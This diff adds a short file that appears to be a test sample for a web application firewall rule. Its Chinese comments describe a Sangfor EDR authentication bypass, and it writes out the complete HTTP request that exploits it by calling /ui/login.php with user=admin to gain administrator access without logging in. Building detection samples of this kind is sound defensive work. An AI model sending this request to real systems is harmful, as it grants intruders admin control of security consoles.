@@ -1,0 +1,9 @@
+# 利用【Sangfor EDR 认证绕过漏洞访问系统】-30000224
+# Sangfor EDR中的一个漏洞允许远程攻击者通过使用提供的用户名直接访问登录页面，而不是通过登录，以“管理员”权限访问系统
+GET /ui/login.php?user=admin&acid=30000224&bid=hd_tag_m8mv25ri HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25ri
+RM-PRO-Token: 7da5fcc534d4d792e3c0e7bfa5b47e5a
+RM-PRO-Time: 1742808502671
+User-Agent: curl/7.83.1
+
